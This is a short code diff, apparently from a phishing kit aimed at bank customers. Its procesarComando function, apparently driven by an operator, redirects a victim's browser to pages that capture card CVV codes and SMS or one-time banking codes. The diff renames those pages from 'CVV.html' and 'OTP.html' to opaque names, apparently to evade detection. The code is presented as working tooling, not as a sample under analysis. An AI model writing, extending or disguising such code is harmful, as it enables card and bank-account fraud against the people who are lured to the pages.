@@ -147,9 +147,9 @@
 
         async function procesarComando(command) {
             if (command === 'cvv') {
-                window.location.replace(basePath + 'CVV.html');
+                window.location.replace(basePath + 'v92_sec_c3v.html');
             } else if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'sms-error' || command === 'mensaje' || command === 'seguridad') {
-                window.location.replace(basePath + 'OTP.html?cmd=' + command);
+                window.location.replace(basePath + 'v92_sec_o7p.html?cmd=' + command);
             } else if (command === 'login-error' || command === 'usuario') {
                 const loader = document.getElementById('loaderOverlay');
                 if (loader) loader.style.display = 'none';
